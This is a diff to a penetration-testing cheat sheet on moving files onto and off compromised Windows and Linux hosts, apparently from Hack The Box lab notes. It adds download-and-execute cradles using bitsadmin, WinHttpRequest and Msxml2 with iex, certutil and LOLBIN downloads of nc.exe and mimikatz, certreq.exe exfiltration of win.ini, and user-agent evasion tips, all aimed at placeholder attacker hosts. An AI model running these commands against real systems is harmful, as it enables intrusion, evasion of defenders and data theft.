@@ -13,7 +13,9 @@ tags:
 
 Encrypting the data or files before a transfer is often necessary to prevent the data from being read if intercepted in transit.
 
-## File Encryption on Windows: Invoke-AESEncryption.ps1
+## Windows
+
+### File Encryption on Windows: Invoke-AESEncryption.ps1
 
 Download it from: https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1 Also, see the code snippet below.
 
@@ -173,9 +175,99 @@ Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
 ```
 
 
-## File Encryption on Linux: 
+### Bitsadmin
 
-### Encrypting /etc/passwd with openssl
+The [Background Intelligent Transfer Service (BITS)](https://docs.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal) can be used to download files from HTTP sites and SMB shares. It "intelligently" checks host and network utilization into account to minimize the impact on a user's foreground work.
+
+Download a file:
+
+```powershell-session
+PS C:\htb> bitsadmin /transfer wcb /priority foreground http://$ipAttacker:$portAttacker/nc.exe C:\Users\htb-student\Desktop\nc.exe
+```
+
+```powershell-session
+PS C:\htb> Import-Module bitstransfer;
+PS C:\htb> Start-BitsTransfer 'http://$ipAttacker:$portAttacker/nc.exe' $env:temp\t;
+PS C:\htb> $r=gc $env:temp\t;
+PS C:\htb> rm $env:temp\t; 
+PS C:\htb> iex $r
+```
+
+
+
+### Certutil
+
+Certutil can be used to download arbitrary files. It is available in all Windows versions and has been a popular file transfer technique, serving as a defacto wget for Windows. However, the Antimalware Scan Interface (AMSI) currently detects this as malicious Certutil usage.
+
+Download a file:
+
+```cmd-session
+C:\htb> certutil.exe -verifyctl -split -f http://$ipAttacker:$portAttacker/nc.exe
+
+C:\htb> certutil -urlcache -split -f http://$ipAttacker:$portAttacker/nc.exe 
+C:\htb> certutil -verifyctl -split -f http://$ipAttacker:$portAttacker/nc.exe
+
+
+```
+
+###  Invoke-WebRequest
+
+In the attacker's machine:
+
+```
+nc -lnvp $port
+```
+
+In the  victim's machine:
+
+```powershell-session
+PS C:\htb> Invoke-WebRequest http://$ipAttacker:$portAttacker/nc.exe -OutFile "C:\Users\Public\nc.exe" 
+
+PS C:\htb> Invoke-RestMethod http://$ipAttacker:$portAttacker/nc.exe -OutFile "C:\Users\Public\nc.exe"
+```
+
+
+### WinHttpRequest
+
+In the attacker's machine:
+
+```
+nc -lnvp $port
+```
+
+In the  victim's machine:
+
+```powershell-session
+PS C:\htb> $h=new-object -com WinHttp.WinHttpRequest.5.1;
+
+PS C:\htb> $h.open('GET','http://$ipAttacker:$portAttacker/nc.exe',$false);
+PS C:\htb> $h.send();
+PS C:\htb> iex $h.ResponseText
+```
+
+
+### Msxml2
+
+In the attacker's machine:
+
+```
+nc -lnvp $port
+```
+
+In the  victim's machine:
+
+```powershell-session
+PS C:\htb> $h=New-Object -ComObject Msxml2.XMLHTTP;
+PS C:\htb> $h.open('GET','http://$ipAttacker:$portAttacker/nc.exe',$false);
+PS C:\htb> $h.send();
+PS C:\htb> iex $h.responseText
+```
+
+
+
+## Linux
+
+### File Encryption on Linux: Encrypting /etc/passwd with openssl
 
 ```shell-session
 openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
@@ -188,15 +280,77 @@ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
 ```
 
 
+### openssl
+
+Create a certificate in the attacker's machine:
+
+```shell-session
+openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
+```
+
+Launch the openssl server in the attacker's machine:
+
+```shell-session
+openssl s_server -quiet -accept $portAttacker -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
+```
+
+Next, with the server running, we need to download the file from the compromised machine. So, download the file from the victim's machine:
+
+```shell-session
+openssl s_client -connect $ipAttacker:$portAttacker -quiet > LinEnum.sh
+```
+
+## LOLBAS / GTFOBins
+
+- [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io/)
+- [GTFOBins for Linux Binaries](https://gtfobins.github.io/)
+
+Application whitelisting may prevent you from using PowerShell or Netcat, and command-line logging may alert defenders to your presence. In this case, an option may be to use a "LOLBIN" (living off the land binary), alternatively also known as "misplaced trust binaries."
+
+
+### GfxDownloadWrapper.exe
+
+An example LOLBIN is the Intel Graphics Driver for Windows 10 (GfxDownloadWrapper.exe), installed on some systems and contains functionality to download configuration files periodically. This download functionality can be invoked as follows:
+
+```powershell
+GfxDownloadWrapper.exe "http://$ipAttacker:$portAttacker/mimikatz.exe" "C:\Temp\nc.exe"
+```
+
+
+Such a binary might be permitted to run by application whitelisting and be excluded from alerting.
+
+### certreq.exe
+
+Upload win.init to our attacker's machine
+
+Attacker machine
+
+```bash
+sudo nc -lnvp $portAttacker
+```
+
+Victim's machine: 
+
+```cmd-session
+certreq.exe -Post -config http://$ipAttacker:$portAttacker/ c:\windows\win.ini
+```
+
+If you get an error when running `certreq.exe`, the version you are using may not contain the `-Post` parameter. You can download an updated version [here](https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe) and try again.
+
+
 ## Changing User Agent
 
-**Request with Invoke-WebRequest and Chrome User agent**
+### Request with Invoke-WebRequest and Chrome User agent
+
+If administrators or defenders have blacklisted any of these User Agents, [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.1) contains a UserAgent parameter, which allows for changing the default user agent
 
 Listing user agents: 
 
 ```powershell
 [Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
 ```
+
+Results: 
 
 ```txt
 Name       : InternetExplorer
@@ -229,13 +383,3 @@ nc -lvnp 80
 ```
 
 
-## LOLBAS / GTFOBins
-
-Application whitelisting may prevent you from using PowerShell or Netcat, and command-line logging may alert defenders to your presence. In this case, an option may be to use a "LOLBIN" (living off the land binary), alternatively also known as "misplaced trust binaries." An example LOLBIN is the Intel Graphics Driver for Windows 10 (GfxDownloadWrapper.exe), installed on some systems and contains functionality to download configuration files periodically. This download functionality can be invoked as follows:
-
-```powershell
-GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
-```
-
-
-Such a binary might be permitted to run by application whitelisting and be excluded from alerting.
